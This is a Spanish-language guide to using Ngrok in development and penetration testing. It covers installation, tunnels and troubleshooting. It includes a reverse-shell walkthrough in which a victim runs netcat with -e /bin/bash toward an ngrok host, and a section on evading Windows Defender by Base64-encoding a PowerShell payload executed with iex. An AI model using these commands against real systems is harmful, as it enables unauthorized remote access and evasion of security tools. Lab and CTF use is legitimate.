
---

# Guía Básica de Ngrok para Pentesting y Desarrollo

Ngrok es una herramienta esencial cuando necesitamos exponer servicios locales a Internet, especialmente útil en entornos de pruebas de seguridad, debugging remoto y CTFs. A continuación, desarrollamos una guía pedagógica y práctica sobre su uso.

---

## ¿Qué es Ngrok?

> **Ngrok** nos permite exponer un puerto local mediante un túnel seguro a través de una dirección accesible desde Internet. Esto elimina la necesidad de configurar reenvío de puertos, DNS o servidores intermedios.

## Casos de uso principales

- Pruebas de desarrollo web sin despliegue.
    
- Recepción de peticiones Webhook (ej. Stripe, GitHub).
    
- Acceso remoto a entornos locales.
    
- Recepción de Reverse Shells desde máquinas remotas.
    
- Pruebas de vulnerabilidades tipo Blind XXE, LFI, RCE.
    

---

## Instalación

### En Linux

```bash
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin/
ngrok --version
```

### En Windows

1. Descargamos desde: [https://ngrok.com/download](https://ngrok.com/download)
    
2. Extraemos y movemos `ngrok.exe` a una carpeta accesible.
    
3. Ejecutamos:
    

```powershell
ngrok --version
```

---

## Configuración inicial con cuenta (opcional pero recomendable)

Para usar funcionalidades extendidas:

1. Creamos una cuenta gratuita.
    
2. Obtenemos nuestro `authtoken`.
    
3. Lo configuramos:
    

```bash
ngrok config add-authtoken TU_AUTHTOKEN
```

---

## Uso básico: Exponer puertos locales

### Servidor HTTP

```bash
ngrok http 8080
```

Ngrok genera una URL como:

```
https://abc123.ngrok.io
```

### Túnel TCP (ej. Reverse Shell con Netcat)

```bash
ngrok tcp 4444
```

Ngrok devuelve:

```
tcp://0.tcp.ngrok.io:12345
```

Las conexiones a esa IP:puerto llegarán a nuestra máquina local:4444.

---

## Ejemplo: Reverse Shell con Netcat

1. En nuestra máquina atacante:
    

```bash
nc -lvnp 4444
```

2. Creamos el túnel:
    

```bash
ngrok tcp 4444
```

3. En la víctima:
    

```bash
nc 0.tcp.ngrok.io 12345 -e /bin/bash
```

Esto enviará una reverse shell a nuestro listener.

---

## Comandos últiles

- Ver sesiones activas:
    

```bash
ngrok status
```

- Ver estadísticas de peticiones:
    

```bash
ngrok http 8080 -inspect
```

- Finalizar túneles activos:
    

```bash
ngrok kill
```

---

## Problemas comunes y soluciones

1. **"command not found"**:
    
    - Verificamos instalación:
        
    
    ```bash
    which ngrok
    sudo mv ngrok /usr/local/bin/
    ```
    
2. **"Your account is limited to 1 tunnel"**:
    
    - Solo podemos tener un túnel activo a la vez (cuenta gratuita).
        
    - Cerramos túneles previos:
        
    
    ```bash
    ngrok kill
    ```
    
3. **"Too many connections"**:
    
    - Cambiamos de región:
        
    
    ```bash
    ngrok tcp -region=eu 4444
    ```
    
4. **Ngrok se desconecta tras unos minutos**:
    
    - Solución:
        
    
    ```bash
    ngrok config add-authtoken TU_TOKEN
    ```
    
5. **No recibimos conexiones**:
    
    - Verificamos que `nc` esté escuchando:
        
    
    ```bash
    nc -lvnp 4444
    ```
    
    - Reiniciamos el túnel:
        
    
    ```bash
    ngrok tcp 4444
    ```
    

---

## Evitar detección en Windows Defender

En entornos controlados, evitamos detección codificando el payload en Base64:

1. Codificamos:
    

```powershell
$script = '...'
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($script))
```

2. En la víctima:
    

```powershell
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("BASE64_CODE")) | iex
```

---

## Automatizar reconexión de túnel

Para que el túnel se mantenga activo:

```bash
while true; do
  ngrok tcp 4444
  sleep 28800  # Reinicia cada 8 horas
done
```

---

## Recomendaciones de seguridad

- No compartimos URLs de Ngrok en entornos públicos.
    
- Usamos HTTPS siempre que sea posible.
    
- Protegemos los servicios expuestos con autenticación si procede.
    
- Evitamos exponer servicios críticos sin control.
    

---

## Glosario rápido

|Término|Definición|
|---|---|
|Túnel|Conexión entre un puerto local y una URL pública.|
|Authtoken|Clave para vincular nuestra cuenta Ngrok con nuestro entorno local|
|Reverse Shell|Conexión saliente desde víctima hacia atacante.|
|Subdominio|URL como `*.ngrok.io` que redirige hacia nuestra máquina local|
|Dashboard|Interfaz web para ver el tráfico y estadísticas del túnel|

---

